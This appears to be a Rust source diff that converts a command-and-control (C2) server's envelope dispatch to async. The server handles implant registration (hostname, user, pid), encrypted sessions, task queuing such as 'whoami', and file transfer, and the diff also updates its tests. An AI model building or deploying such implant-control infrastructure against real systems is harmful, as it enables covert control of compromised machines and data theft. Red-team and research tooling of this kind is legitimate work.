@@ -44,11 +44,11 @@ impl Cipher {
 /// Central C2 envelope dispatch shared by every transport (HTTP + TCP + DNS).
 /// Takes an inbound envelope and returns the reply, or an error mapped to a
 /// status for the transport to surface.
-pub fn process(state: &ServerState, env: Envelope) -> Result<Envelope, C2Error> {
+pub async fn process(state: &ServerState, env: Envelope) -> Result<Envelope, C2Error> {
     match env.kind {
-        Kind::Register => process_register(state, env),
-        Kind::TaskResult => process_poll(state, env),
-        Kind::Heartbeat => process_poll(state, env),
+        Kind::Register => process_register(state, env).await,
+        Kind::TaskResult => process_poll(state, env).await,
+        Kind::Heartbeat => process_poll(state, env).await,
         _ => Err(C2Error::BadRequest),
     }
 }
@@ -60,7 +60,7 @@ pub enum C2Error {
     Internal(String),
 }
 
-fn process_register(state: &ServerState, env: Envelope) -> Result<Envelope, C2Error> {
+async fn process_register(state: &ServerState, env: Envelope) -> Result<Envelope, C2Error> {
     if env.session_id.is_some() {
         return Err(C2Error::BadRequest);
     }
@@ -70,8 +70,7 @@ fn process_register(state: &ServerState, env: Envelope) -> Result<Envelope, C2Er
     let pt = cipher
         .unwrap(env.id, &env.encrypted)
         .map_err(|_| C2Error::Unauthorized)?;
-    let reg: Register =
-        serde_json::from_slice(&pt).map_err(|_| C2Error::BadRequest)?;
+    let reg: Register = serde_json::from_slice(&pt).map_err(|_| C2Error::BadRequest)?;
 
     // Forward-secrecy handshake: each side rolls an ephemeral x25519 key and
     // DHs them inside the PSK-authenticated register/ack exchange. The derived
@@ -85,17 +84,23 @@ fn process_register(state: &ServerState, env: Envelope) -> Result<Envelope, C2Er
         .map_err(|_| C2Error::Unauthorized)?;
     let session_key = crypto::derive_key(&shared, crypto::SESSION_SALT);
 
-    let sid = state.registry.create(
-        reg.hostname,
-        reg.username,
-        reg.os,
-        reg.arch,
-        reg.pid,
-        reg.addr,
-        session_key,
-    );
+    let sid = state
+        .registry
+        .create(
+            reg.hostname,
+            reg.username,
+            reg.os,
+            reg.arch,
+            reg.pid,
+            reg.addr,
+            session_key,
+        )
+        .await;
 
-    let ack = RegisterAck { session_id: sid, server_pub: encode_key(&server_kp.public_key()) };
+    let ack = RegisterAck {
+        session_id: sid,
+        server_pub: encode_key(&server_kp.public_key()),
+    };
     let reply_id = env.id + 1;
     let plaintext =
         serde_json::to_vec(&ack).map_err(|_| C2Error::Internal("serialize ack".into()))?;
@@ -107,23 +112,22 @@ fn process_register(state: &ServerState, env: Envelope) -> Result<Envelope, C2Er
     Ok(Envelope::new(Kind::RegisterAck, reply_id, Some(sid), out))
 }
 
-fn process_poll(state: &ServerState, env: Envelope) -> Result<Envelope, C2Error> {
+async fn process_poll(state: &ServerState, env: Envelope) -> Result<Envelope, C2Error> {
     let Some(sid) = env.session_id else {
         return Err(C2Error::BadRequest);
     };
-    let Some(session) = state.registry.get(&sid) else {
+    let Some(session) = state.registry.get(&sid).await else {
         return Err(C2Error::Unauthorized);
     };
     let cipher = Cipher::new(session.key);
     let pt = cipher
         .unwrap(env.id, &env.encrypted)
         .map_err(|_| C2Error::Unauthorized)?;
-    let req: PollRequest =
-        serde_json::from_slice(&pt).map_err(|_| C2Error::BadRequest)?;
+    let req: PollRequest = serde_json::from_slice(&pt).map_err(|_| C2Error::BadRequest)?;
 
     // Deliver completed results, then drain pending tasks.
     for r in req.results {
-        state.queue.deliver_result(&sid, r);
+        state.queue.deliver_result(&sid, r).await;
     }
     // Persist any file download chunks and collect resume acks.
     let mut acks: Vec<FileAck> = Vec::new();
@@ -136,17 +140,25 @@ fn process_poll(state: &ServerState, env: Envelope) -> Result<Envelope, C2Error>
         state.uploads.apply_ack(&sid, ack.received, ack.done);
     }
     let push_chunks = state.uploads.push_budget(&sid, req.inner_budget);
-    state.registry.touch(&sid);
-    let pending = state.queue.drain(&sid);
+    state.registry.touch(&sid).await;
+    let pending = state.queue.drain(&sid).await;
 
-    let reply = PollReply { tasks: pending, acks, push_chunks };
+    let reply = PollReply {
+        tasks: pending,
+        acks,
+        push_chunks,
+    };
     let reply_id = env.id + 1;
     let plaintext =
         serde_json::to_vec(&reply).map_err(|_| C2Error::Internal("serialize reply".into()))?;
     let out = crypto::encrypt(&session.key, reply_id, &plaintext)
         .map_err(|_| C2Error::Internal("encrypt reply".into()))?;
     // Kind::Task if we have work, else Heartbeat to save the implant a check.
-    let kind = if reply.tasks.is_empty() { Kind::Heartbeat } else { Kind::Task };
+    let kind = if reply.tasks.is_empty() {
+        Kind::Heartbeat
+    } else {
+        Kind::Task
+    };
     Ok(Envelope::new(kind, reply_id, Some(sid), out))
 }
 
@@ -161,15 +173,15 @@ fn to_status(e: C2Error) -> axum::http::StatusCode {
 /// Open a sealed inbound frame, dispatch it, and re-seal the reply. The clear
 /// routing `session_id` selects the per-session DH key; a frame without one is
 /// a pre-registration register, which uses the PSK-derived key.
-pub fn process_sealed(state: &ServerState, wire: &[u8]) -> Result<Vec<u8>, C2Error> {
+pub async fn process_sealed(state: &ServerState, wire: &[u8]) -> Result<Vec<u8>, C2Error> {
     let wire_str = std::str::from_utf8(wire).map_err(|_| C2Error::BadRequest)?;
     // Peek the clear routing id; None => register (PSK key), Some => session.
     let in_key = match Envelope::routing_id(wire_str) {
         None => derive_session_key(&state.psk),
-        Some(sid) => resolve_session_key(state, &sid)?,
+        Some(sid) => resolve_session_key(state, &sid).await?,
     };
     let env = Envelope::open(&in_key, wire_str).map_err(|_| C2Error::Unauthorized)?;
-    let reply = process(state, env)?;
+    let reply = process(state, env).await?;
     // The reply rides the same key as the request it answers.
     let sealed = reply
         .seal(&in_key)
@@ -177,10 +189,14 @@ pub fn process_sealed(state: &ServerState, wire: &[u8]) -> Result<Vec<u8>, C2Err
     Ok(sealed.into_bytes())
 }
 
-fn resolve_session_key(state: &ServerState, sid: &uuid::Uuid) -> Result<[u8; crypto::KEY_LEN], C2Error> {
+async fn resolve_session_key(
+    state: &ServerState,
+    sid: &uuid::Uuid,
+) -> Result<[u8; crypto::KEY_LEN], C2Error> {
     state
         .registry
         .get(sid)
+        .await
         .map(|s| s.key)
         .ok_or(C2Error::Unauthorized)
 }
@@ -190,6 +206,7 @@ async fn checkin_http(
     body: axum::body::Bytes,
 ) -> Result<axum::body::Bytes, axum::http::StatusCode> {
     process_sealed(&state, &body)
+        .await
         .map(axum::body::Bytes::from)
         .map_err(to_status)
 }
@@ -281,7 +298,9 @@ mod tests {
             .await
             .unwrap();
         assert_eq!(resp.status(), StatusCode::OK);
-        let ack_wire = axum::body::to_bytes(resp.into_body(), usize::MAX).await.unwrap();
+        let ack_wire = axum::body::to_bytes(resp.into_body(), usize::MAX)
+            .await
+            .unwrap();
         let ack_wire = std::str::from_utf8(&ack_wire).unwrap();
         // The ack reply is sealed with the PSK key (register phase).
         let ack = Envelope::open(&psk_key, ack_wire).unwrap();
@@ -296,6 +315,7 @@ mod tests {
 
         // poll with a queued task
         q.push(&ack_msg.session_id, "whoami".into(), vec![], 1000)
+            .await
             .unwrap();
         let poll_plain = serde_json::to_vec(&PollRequest::default()).unwrap();
         let poll_ct = crypto::encrypt(&session_key, 2, &poll_plain).unwrap();
@@ -313,7 +333,9 @@ mod tests {
             .await
             .unwrap();
         assert_eq!(resp2.status(), StatusCode::OK);
-        let reply_wire = axum::body::to_bytes(resp2.into_body(), usize::MAX).await.unwrap();
+        let reply_wire = axum::body::to_bytes(resp2.into_body(), usize::MAX)
+            .await
+            .unwrap();
         let reply_wire = std::str::from_utf8(&reply_wire).unwrap();
         let reply = Envelope::open(&session_key, reply_wire).unwrap();
         // Poll reply envelope has id = request id + 1 -> 2 + 1 = 3.
